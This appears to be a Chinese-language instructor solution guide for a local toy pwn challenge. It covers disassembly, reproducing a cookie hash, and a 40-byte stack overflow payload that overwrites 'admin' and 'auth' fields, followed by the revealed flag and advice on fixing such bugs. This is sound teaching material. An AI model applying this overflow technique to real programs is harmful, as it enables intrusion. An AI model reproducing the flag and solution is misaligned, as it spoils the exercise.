# Pwn 讲师解题步骤

## 环境与构建

```bash
cd pwn
./build.sh              # 重新生成 instructor/src/secret.h 并编译 public/pwnme
python3 solve.py
```

`build.sh` 从 `instructor/flag.txt` 读取 flag，用
`flag_enc[i] = flag[i] xor (i*13 + 0x37)` 编码后嵌入二进制。`public/` 中不含明文 flag。

## 步骤 1：确认保护与两道门

```bash
file public/pwnme
readelf -h public/pwnme | grep Type        # EXEC，非 PIE
objdump -d -M intel --disassemble=main public/pwnme
objdump -d -M intel --disassemble=mix_challenge public/pwnme
```

`main` 的关键流程：

```asm
call   random_u32
call   mix_challenge                 ; 由 challenge 得到 cookie
printf("challenge=%08x\n", challenge)
puts("cookie:")
fgets(line, ...)                     ; 读取 cookie
cmp    DWORD PTR [rbp-0x4],eax       ; 与 cookie 比较
...
puts("gate 1 passed")
lea    rax,[rbp-0x90]                ; name
mov    edx,0x60                      ; read 96 字节
call   read
...
mov    eax,DWORD PTR [rbp-0x70]      ; admin
cmp    eax,0x1337
...
mov    eax,DWORD PTR [rbp-0x6c]      ; auth
cmp    DWORD PTR [rbp-0x4],eax       ; auth == cookie
...
call   win
```

`mix_challenge` 是 32 位无符号混合：

```c
x ^= 0x9e3779b9u;
x = rotl32(x, 13);
x *= 0x85ebca6bu;
x ^= x >> 16;
x *= 0xc2b2ae35u;
x ^= x >> 13;
return x ^ 0x1337c0deu;
```

Python 复现时每一步都要 `& 0xffffffff`，循环左移可用
`((x << 13) | (x >> 19)) & 0xffffffff`。

## 步骤 2：第一道门

程序每次运行都会用 `getrandom()` 生成新的 32 位 challenge，因此不能硬编码 cookie。
`solve.py` 先从 stdout 读取 `challenge=...`，计算 cookie，再写回一行十进制数：

```python
challenge = int(line.split("challenge=", 1)[1], 16)
cookie = mix_challenge(challenge)
proc.stdin.write(f"{cookie}\n".encode())
```

## 步骤 3：第二道门

编译参数包含 `-O0 -fno-stack-protector -no-pie`。局部结构体布局为：

```c
struct {
    char name[32];       /* [rbp-0x90] */
    uint32_t admin;      /* [rbp-0x70] */
    uint32_t auth;       /* [rbp-0x6c] */
} s;
```

从 `name` 起点到 `admin` 是 `0x90 - 0x70 = 0x20 = 32` 字节，`auth` 紧接在
`admin` 后 4 字节。`read()` 允许 96 字节，因此一次线性溢出可以同时覆盖两个字段：

```text
[ 32 字节填充 'A' ][ admin = 0x1337 ][ auth = cookie ]
                     37 13 00 00        <cookie 小端 4 字节>
```

这样 `admin` 和 `auth` 都满足约束，程序打印：

```text
admin unlocked
flag{0v3rwr1t3_th3_4dm1n}
```

`solve.py` 从 `objdump` 中定位 `name` 和 `admin`，再由结构体布局得到 `auth`，
自动完成整个交互：

```bash
python3 solve.py
```

示例输出（challenge/cookie 每次不同）：

```text
[1] name @ [rbp-0x90], admin @ [rbp-0x70], auth @ [rbp-0x6c]
    challenge=e6b7f4f2
[2] challenge=0xe6b7f4f2 -> cookie=0x5b6e40a4
    gate 1 passed
[3] payload (40 bytes): 4141...37130000a4406e5b
[4] target output:
admin unlocked
flag{0v3rwr1t3_th3_4dm1n}
[+] FLAG: flag{0v3rwr1t3_th3_4dm1n}
```

## 为什么没有 shell

`win()` 只遍历编码后的 flag 数组并 `putchar`，不调用 `system`、不执行命令，
也没有网络代码。题目目标是计算随机 cookie 并控制两个局部变量，属于本地玩具题，
不涉及提权或远程利用。

## 修复建议（讲师可讲）

- 用 `fgets`/`read` 时严格限制长度，并检查返回值。
- 把安全标记与缓冲区分离，或使用无法被线性溢出的结构。
- 开启 `-fstack-protector-strong`、PIE、FORTIFY_SOURCE 等缓解措施。
- 真正的权限判断应放在服务端，不能在客户端二进制里放敏感 flag。
- 随机挑战必须绑定会话并限制尝试次数，不能只靠客户端本地比较。
